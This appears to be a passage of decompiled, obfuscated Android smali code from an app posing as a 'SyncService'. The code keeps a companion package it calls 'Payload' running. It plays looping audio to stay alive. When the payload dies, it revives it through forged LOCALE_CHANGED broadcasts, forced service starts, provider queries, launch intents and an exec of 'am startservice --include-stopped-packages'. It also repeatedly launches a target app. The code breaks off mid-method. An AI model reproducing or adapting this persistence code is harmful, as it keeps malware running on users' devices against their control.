.class public final synthetic LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;
.super Ljava/lang/Object;
.source "r8-map-id-9b89e78e9c5e8923134474d94771b179d9c458b216b15abf6fb75f52fa5f6b53"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic ECM0w2UpL85TD4rnc:Ljava/lang/Object;

.field public final synthetic VYRgR7ZqgbZj3I16R:I

.field public final synthetic WAxAMT28akcO:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(Ljava/lang/Object;Ljava/lang/Object;I)V
    .locals 0

    .line 1
    iput p3, p0, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->VYRgR7ZqgbZj3I16R:I

    .line 2
    .line 3
    iput-object p1, p0, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->ECM0w2UpL85TD4rnc:Ljava/lang/Object;

    .line 4
    .line 5
    iput-object p2, p0, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->WAxAMT28akcO:Ljava/lang/Object;

    .line 6
    .line 7
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 8
    .line 9
    .line 10
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 24

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    iget v0, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->VYRgR7ZqgbZj3I16R:I

    .line 4
    .line 5
    const-wide/16 v4, 0x3e8

    .line 6
    .line 7
    const/4 v6, 0x0

    .line 8
    packed-switch v0, :pswitch_data_0

    .line 9
    .line 10
    .line 11
    iget-object v0, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->ECM0w2UpL85TD4rnc:Ljava/lang/Object;

    .line 12
    .line 13
    check-cast v0, Lio/bluewave/app/services/SyncService;

    .line 14
    .line 15
    iget-object v2, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->WAxAMT28akcO:Ljava/lang/Object;

    .line 16
    .line 17
    check-cast v2, [B

    .line 18
    .line 19
    :goto_0
    iget-boolean v3, v0, Lio/bluewave/app/services/SyncService;->WAxAMT28akcO:Z

    .line 20
    .line 21
    if-eqz v3, :cond_0

    .line 22
    .line 23
    :try_start_0
    iget-object v3, v0, Lio/bluewave/app/services/SyncService;->ECM0w2UpL85TD4rnc:Landroid/media/AudioTrack;

    .line 24
    .line 25
    array-length v7, v2

    .line 26
    invoke-virtual {v3, v2, v6, v7}, Landroid/media/AudioTrack;->write([BII)I

    .line 27
    .line 28
    .line 29
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 30
    .line 31
    .line 32
    goto :goto_0

    .line 33
    :catchall_0
    :cond_0
    return-void

    .line 34
    :pswitch_0
    iget-object v0, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->ECM0w2UpL85TD4rnc:Ljava/lang/Object;

    .line 35
    .line 36
    move-object v7, v0

    .line 37
    check-cast v7, Lio/bluewave/app/services/SyncService;

    .line 38
    .line 39
    iget-object v0, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->WAxAMT28akcO:Ljava/lang/Object;

    .line 40
    .line 41
    move-object v8, v0

    .line 42
    check-cast v8, Ljava/lang/String;

    .line 43
    .line 44
    :goto_1
    move v9, v6

    .line 45
    :goto_2
    iget-boolean v0, v7, Lio/bluewave/app/services/SyncService;->vpNdwwpwBwplN:Z

    .line 46
    .line 47
    if-eqz v0, :cond_a

    .line 48
    .line 49
    const-wide/16 v10, 0x2710

    .line 50
    .line 51
    :try_start_1
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_3

    .line 52
    .line 53
    .line 54
    invoke-virtual {v7, v8}, Lio/bluewave/app/services/SyncService;->VYRgR7ZqgbZj3I16R(Ljava/lang/String;)Z

    .line 55
    .line 56
    .line 57
    move-result v0

    .line 58
    if-eqz v0, :cond_1

    .line 59
    .line 60
    goto :goto_1

    .line 61
    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    .line 62
    .line 63
    const-string v10, "Payload DEAD: "

    .line 64
    .line 65
    invoke-direct {v0, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 66
    .line 67
    .line 68
    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 69
    .line 70
    .line 71
    const-string v10, " streak="

    .line 72
    .line 73
    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 74
    .line 75
    .line 76
    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 77
    .line 78
    .line 79
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 80
    .line 81
    .line 82
    move-result-object v0

    .line 83
    const-string v10, "DRP_SVC"

    .line 84
    .line 85
    invoke-static {v10, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 86
    .line 87
    .line 88
    :try_start_2
    invoke-virtual {v7}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 89
    .line 90
    .line 91
    move-result-object v0

    .line 92
    const/16 v11, 0x202

    .line 93
    .line 94
    invoke-virtual {v0, v8, v11}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    .line 95
    .line 96
    .line 97
    move-result-object v0

    .line 98
    iget-object v0, v0, Landroid/content/pm/PackageInfo;->receivers:[Landroid/content/pm/ActivityInfo;

    .line 99
    .line 100
    if-eqz v0, :cond_2

    .line 101
    .line 102
    array-length v11, v0

    .line 103
    move v12, v6

    .line 104
    :goto_3
    if-ge v12, v11, :cond_2

    .line 105
    .line 106
    aget-object v13, v0, v12
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_3

    .line 107
    .line 108
    :try_start_3
    new-instance v14, Landroid/content/Intent;

    .line 109
    .line 110
    const-string v15, "android.intent.action.LOCALE_CHANGED"

    .line 111
    .line 112
    invoke-direct {v14, v15}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 113
    .line 114
    .line 115
    new-instance v15, Landroid/content/ComponentName;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 116
    .line 117
    const-wide/16 v16, 0x7d0

    .line 118
    .line 119
    :try_start_4
    iget-object v2, v13, Landroid/content/pm/ActivityInfo;->name:Ljava/lang/String;

    .line 120
    .line 121
    invoke-direct {v15, v8, v2}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 122
    .line 123
    .line 124
    invoke-virtual {v14, v15}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 125
    .line 126
    .line 127
    const/16 v2, 0x20

    .line 128
    .line 129
    invoke-virtual {v14, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 130
    .line 131
    .line 132
    invoke-virtual {v7, v14}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 133
    .line 134
    .line 135
    new-instance v2, Ljava/lang/StringBuilder;

    .line 136
    .line 137
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 138
    .line 139
    .line 140
    const-string v3, "Broadcast sent to "

    .line 141
    .line 142
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 143
    .line 144
    .line 145
    iget-object v3, v13, Landroid/content/pm/ActivityInfo;->name:Ljava/lang/String;

    .line 146
    .line 147
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 148
    .line 149
    .line 150
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 151
    .line 152
    .line 153
    move-result-object v2

    .line 154
    invoke-static {v10, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 155
    .line 156
    .line 157
    goto :goto_4

    .line 158
    :catchall_1
    const-wide/16 v16, 0x7d0

    .line 159
    .line 160
    :catchall_2
    :goto_4
    add-int/lit8 v12, v12, 0x1

    .line 161
    .line 162
    goto :goto_3

    .line 163
    :catchall_3
    move-exception v0

    .line 164
    const-wide/16 v16, 0x7d0

    .line 165
    .line 166
    goto :goto_5

    .line 167
    :cond_2
    const-wide/16 v16, 0x7d0

    .line 168
    .line 169
    goto :goto_6

    .line 170
    :goto_5
    new-instance v2, Ljava/lang/StringBuilder;

    .line 171
    .line 172
    const-string v3, "Receiver enum failed: "

    .line 173
    .line 174
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 175
    .line 176
    .line 177
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 178
    .line 179
    .line 180
    move-result-object v0

    .line 181
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 182
    .line 183
    .line 184
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 185
    .line 186
    .line 187
    move-result-object v0

    .line 188
    invoke-static {v10, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 189
    .line 190
    .line 191
    :goto_6
    :try_start_5
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_0

    .line 192
    .line 193
    .line 194
    :catch_0
    invoke-virtual {v7, v8}, Lio/bluewave/app/services/SyncService;->VYRgR7ZqgbZj3I16R(Ljava/lang/String;)Z

    .line 195
    .line 196
    .line 197
    move-result v0

    .line 198
    const/4 v2, 0x4

    .line 199
    if-eqz v0, :cond_3

    .line 200
    .line 201
    const-string v0, "Payload alive after broadcast"

    .line 202
    .line 203
    invoke-static {v10, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 204
    .line 205
    .line 206
    goto/16 :goto_9

    .line 207
    .line 208
    :cond_3
    :try_start_6
    invoke-virtual {v7}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 209
    .line 210
    .line 211
    move-result-object v0

    .line 212
    invoke-virtual {v0, v8, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    .line 213
    .line 214
    .line 215
    move-result-object v0

    .line 216
    iget-object v0, v0, Landroid/content/pm/PackageInfo;->services:[Landroid/content/pm/ServiceInfo;

    .line 217
    .line 218
    if-eqz v0, :cond_4

    .line 219
    .line 220
    array-length v3, v0

    .line 221
    move v11, v6

    .line 222
    :goto_7
    if-ge v11, v3, :cond_4

    .line 223
    .line 224
    aget-object v12, v0, v11
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_5

    .line 225
    .line 226
    :try_start_7
    new-instance v13, Landroid/content/Intent;

    .line 227
    .line 228
    invoke-direct {v13}, Landroid/content/Intent;-><init>()V

    .line 229
    .line 230
    .line 231
    new-instance v14, Landroid/content/ComponentName;

    .line 232
    .line 233
    iget-object v15, v12, Landroid/content/pm/ServiceInfo;->name:Ljava/lang/String;

    .line 234
    .line 235
    invoke-direct {v14, v8, v15}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 236
    .line 237
    .line 238
    invoke-virtual {v13, v14}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 239
    .line 240
    .line 241
    invoke-virtual {v7, v13}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 242
    .line 243
    .line 244
    new-instance v13, Ljava/lang/StringBuilder;

    .line 245
    .line 246
    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    .line 247
    .line 248
    .line 249
    const-string v14, "startService: "

    .line 250
    .line 251
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 252
    .line 253
    .line 254
    iget-object v12, v12, Landroid/content/pm/ServiceInfo;->name:Ljava/lang/String;

    .line 255
    .line 256
    invoke-virtual {v13, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 257
    .line 258
    .line 259
    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 260
    .line 261
    .line 262
    move-result-object v12

    .line 263
    invoke-static {v10, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_4

    .line 264
    .line 265
    .line 266
    :catchall_4
    add-int/lit8 v11, v11, 0x1

    .line 267
    .line 268
    goto :goto_7

    .line 269
    :catchall_5
    move-exception v0

    .line 270
    new-instance v3, Ljava/lang/StringBuilder;

    .line 271
    .line 272
    const-string v11, "Service enum failed: "

    .line 273
    .line 274
    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 275
    .line 276
    .line 277
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 278
    .line 279
    .line 280
    move-result-object v0

    .line 281
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 282
    .line 283
    .line 284
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 285
    .line 286
    .line 287
    move-result-object v0

    .line 288
    invoke-static {v10, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 289
    .line 290
    .line 291
    :cond_4
    :try_start_8
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V
    :try_end_8
    .catch Ljava/lang/InterruptedException; {:try_start_8 .. :try_end_8} :catch_1

    .line 292
    .line 293
    .line 294
    :catch_1
    invoke-virtual {v7, v8}, Lio/bluewave/app/services/SyncService;->VYRgR7ZqgbZj3I16R(Ljava/lang/String;)Z

    .line 295
    .line 296
    .line 297
    move-result v0

    .line 298
    if-eqz v0, :cond_5

    .line 299
    .line 300
    const-string v0, "Payload alive after service start"

    .line 301
    .line 302
    invoke-static {v10, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 303
    .line 304
    .line 305
    goto/16 :goto_9

    .line 306
    .line 307
    :cond_5
    :try_start_9
    invoke-virtual {v7}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 308
    .line 309
    .line 310
    move-result-object v0

    .line 311
    const/16 v3, 0x8

    .line 312
    .line 313
    invoke-virtual {v0, v8, v3}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    .line 314
    .line 315
    .line 316
    move-result-object v0

    .line 317
    iget-object v0, v0, Landroid/content/pm/PackageInfo;->providers:[Landroid/content/pm/ProviderInfo;

    .line 318
    .line 319
    if-eqz v0, :cond_7

    .line 320
    .line 321
    array-length v3, v0

    .line 322
    move v11, v6

    .line 323
    :goto_8
    if-ge v11, v3, :cond_7

    .line 324
    .line 325
    aget-object v12, v0, v11

    .line 326
    .line 327
    iget-object v13, v12, Landroid/content/pm/ProviderInfo;->authority:Ljava/lang/String;
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_7

    .line 328
    .line 329
    if-eqz v13, :cond_6

    .line 330
    .line 331
    :try_start_a
    invoke-virtual {v7}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 332
    .line 333
    .line 334
    move-result-object v18

    .line 335
    new-instance v13, Ljava/lang/StringBuilder;

    .line 336
    .line 337
    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    .line 338
    .line 339
    .line 340
    const-string v14, "content://"

    .line 341
    .line 342
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 343
    .line 344
    .line 345
    iget-object v14, v12, Landroid/content/pm/ProviderInfo;->authority:Ljava/lang/String;

    .line 346
    .line 347
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 348
    .line 349
    .line 350
    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 351
    .line 352
    .line 353
    move-result-object v13

    .line 354
    invoke-static {v13}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 355
    .line 356
    .line 357
    move-result-object v19

    .line 358
    const/16 v22, 0x0

    .line 359
    .line 360
    const/16 v23, 0x0

    .line 361
    .line 362
    const/16 v20, 0x0

    .line 363
    .line 364
    const/16 v21, 0x0

    .line 365
    .line 366
    invoke-virtual/range {v18 .. v23}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    .line 367
    .line 368
    .line 369
    new-instance v13, Ljava/lang/StringBuilder;

    .line 370
    .line 371
    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    .line 372
    .line 373
    .line 374
    const-string v14, "Provider query: "

    .line 375
    .line 376
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 377
    .line 378
    .line 379
    iget-object v12, v12, Landroid/content/pm/ProviderInfo;->authority:Ljava/lang/String;

    .line 380
    .line 381
    invoke-virtual {v13, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 382
    .line 383
    .line 384
    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 385
    .line 386
    .line 387
    move-result-object v12

    .line 388
    invoke-static {v10, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_6

    .line 389
    .line 390
    .line 391
    :catchall_6
    :cond_6
    add-int/lit8 v11, v11, 0x1

    .line 392
    .line 393
    goto :goto_8

    .line 394
    :catchall_7
    move-exception v0

    .line 395
    new-instance v3, Ljava/lang/StringBuilder;

    .line 396
    .line 397
    const-string v11, "Provider enum failed: "

    .line 398
    .line 399
    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 400
    .line 401
    .line 402
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 403
    .line 404
    .line 405
    move-result-object v0

    .line 406
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 407
    .line 408
    .line 409
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 410
    .line 411
    .line 412
    move-result-object v0

    .line 413
    invoke-static {v10, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 414
    .line 415
    .line 416
    :cond_7
    :try_start_b
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V
    :try_end_b
    .catch Ljava/lang/InterruptedException; {:try_start_b .. :try_end_b} :catch_2

    .line 417
    .line 418
    .line 419
    :catch_2
    invoke-virtual {v7, v8}, Lio/bluewave/app/services/SyncService;->VYRgR7ZqgbZj3I16R(Ljava/lang/String;)Z

    .line 420
    .line 421
    .line 422
    move-result v0

    .line 423
    if-eqz v0, :cond_8

    .line 424
    .line 425
    const-string v0, "Payload alive after provider query"

    .line 426
    .line 427
    invoke-static {v10, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 428
    .line 429
    .line 430
    goto :goto_9

    .line 431
    :cond_8
    :try_start_c
    invoke-virtual {v7}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 432
    .line 433
    .line 434
    move-result-object v0

    .line 435
    invoke-virtual {v0, v8}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 436
    .line 437
    .line 438
    move-result-object v0

    .line 439
    if-eqz v0, :cond_9

    .line 440
    .line 441
    const v3, 0x10000020

    .line 442
    .line 443
    .line 444
    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 445
    .line 446
    .line 447
    invoke-virtual {v7, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 448
    .line 449
    .line 450
    const-string v0, "Restart via launchIntent"

    .line 451
    .line 452
    invoke-static {v10, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_8

    .line 453
    .line 454
    .line 455
    goto :goto_9

    .line 456
    :catchall_8
    move-exception v0

    .line 457
    new-instance v3, Ljava/lang/StringBuilder;

    .line 458
    .line 459
    const-string v11, "launchIntent failed: "

    .line 460
    .line 461
    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 462
    .line 463
    .line 464
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 465
    .line 466
    .line 467
    move-result-object v0

    .line 468
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 469
    .line 470
    .line 471
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 472
    .line 473
    .line 474
    move-result-object v0

    .line 475
    invoke-static {v10, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 476
    .line 477
    .line 478
    :cond_9
    :try_start_d
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    .line 479
    .line 480
    .line 481
    move-result-object v0

    .line 482
    const-string v3, "/system/bin/am"

    .line 483
    .line 484
    const-string v11, "startservice"

    .line 485
    .line 486
    const-string v12, "--include-stopped-packages"

    .line 487
    .line 488
    const-string v13, "-n"

    .line 489
    .line 490
    new-instance v14, Ljava/lang/StringBuilder;

    .line 491
    .line 492
    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    .line 493
    .line 494
    .line 495
    invoke-virtual {v14, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 496
    .line 497
    .line 498
    const-string v15, "/.services.SyncRWAdapter"

    .line 499
    .line 500
    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 501
    .line 502
    .line 503
    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 504
    .line 505
    .line 506
    move-result-object v14

    .line 507
    filled-new-array {v3, v11, v12, v13, v14}, [Ljava/lang/String;

    .line 508
    .line 509
    .line 510
    move-result-object v3

    .line 511
    invoke-virtual {v0, v3}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    .line 512
    .line 513
    .line 514
    const-string v0, "am startservice attempted"

    .line 515
    .line 516
    invoke-static {v10, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_9

    .line 517
    .line 518
    .line 519
    goto :goto_9

    .line 520
    :catchall_9
    move-exception v0

    .line 521
    new-instance v3, Ljava/lang/StringBuilder;

    .line 522
    .line 523
    const-string v11, "am startservice failed: "

    .line 524
    .line 525
    invoke-direct {v3, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 526
    .line 527
    .line 528
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 529
    .line 530
    .line 531
    move-result-object v0

    .line 532
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 533
    .line 534
    .line 535
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 536
    .line 537
    .line 538
    move-result-object v0

    .line 539
    invoke-static {v10, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 540
    .line 541
    .line 542
    :goto_9
    add-int/lit8 v9, v9, 0x1

    .line 543
    .line 544
    invoke-static {v9, v2}, Ljava/lang/Math;->min(II)I

    .line 545
    .line 546
    .line 547
    move-result v0

    .line 548
    const/4 v2, 0x1

    .line 549
    shl-int v0, v2, v0

    .line 550
    .line 551
    mul-int/lit8 v0, v0, 0x1e

    .line 552
    .line 553
    const/16 v2, 0x12c

    .line 554
    .line 555
    invoke-static {v0, v2}, Ljava/lang/Math;->min(II)I

    .line 556
    .line 557
    .line 558
    move-result v0

    .line 559
    int-to-long v2, v0

    .line 560
    mul-long/2addr v2, v4

    .line 561
    :try_start_e
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_e
    .catch Ljava/lang/InterruptedException; {:try_start_e .. :try_end_e} :catch_3

    .line 562
    .line 563
    .line 564
    goto/16 :goto_2

    .line 565
    .line 566
    :catch_3
    :cond_a
    return-void

    .line 567
    :pswitch_1
    const-wide/16 v16, 0x7d0

    .line 568
    .line 569
    iget-object v0, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->ECM0w2UpL85TD4rnc:Ljava/lang/Object;

    .line 570
    .line 571
    move-object v2, v0

    .line 572
    check-cast v2, Landroid/content/Context;

    .line 573
    .line 574
    iget-object v0, v1, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;->WAxAMT28akcO:Ljava/lang/Object;

    .line 575
    .line 576
    move-object v3, v0

    .line 577
    check-cast v3, Ljava/lang/String;

    .line 578
    .line 579
    sget v0, Lio/bluewave/app/CB;->VYRgR7ZqgbZj3I16R:I

    .line 580
    .line 581
    :goto_a
    const/16 v0, 0xf

    .line 582
    .line 583
    const-string v4, "CB_DBG"

    .line 584
    .line 585
    if-ge v6, v0, :cond_c

    .line 586
    .line 587
    :try_start_f
    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 588
    .line 589
    .line 590
    move-result-object v0

    .line 591
    invoke-virtual {v0, v3}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 592
    .line 593
    .line 594
    move-result-object v0

    .line 595
    if-eqz v0, :cond_b

    .line 596
    .line 597
    const v5, 0x10008000

    .line 598
    .line 599
    .line 600
    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 601
    .line 602
    .line 603
    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 604
    .line 605
    .line 606
    new-instance v0, Ljava/lang/StringBuilder;

    .line 607
    .line 608
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 609
    .line 610
    .line 611
    const-string v5, "launchTarget: OK via getLaunchIntent attempt="

    .line 612
    .line 613
    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 614
    .line 615
    .line 616
    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 617
    .line 618
    .line 619
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 620
    .line 621
    .line 622
    move-result-object v0

    .line 623
    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 624
    .line 625
    .line 626
    goto :goto_d

    .line 627
    :catch_4
    move-exception v0

    .line 628
    goto :goto_b

    .line 629
    :cond_b
    new-instance v0, Ljava/lang/StringBuilder;

    .line 630
    .line 631
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 632
    .line 633
    .line 634
    const-string v5, "launchTarget: getLaunchIntent returned null, attempt="

    .line 635
    .line 636
    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 637
    .line 638
    .line 639
    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 640
    .line 641
    .line 642
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 643
    .line 644
    .line 645
    move-result-object v0

    .line 646
    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_4

    .line 647
    .line 648
    .line 649
    goto :goto_c

    .line 650
    :goto_b
    new-instance v5, Ljava/lang/StringBuilder;

    .line 651
    .line 652
    const-string v7, "launchTarget: attempt "

    .line 653
    .line 654
    invoke-direct {v5, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 655
    .line 656
    .line 657
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 658
    .line 659
    .line 660
    const-string v7, " failed: "

    .line 661
    .line 662
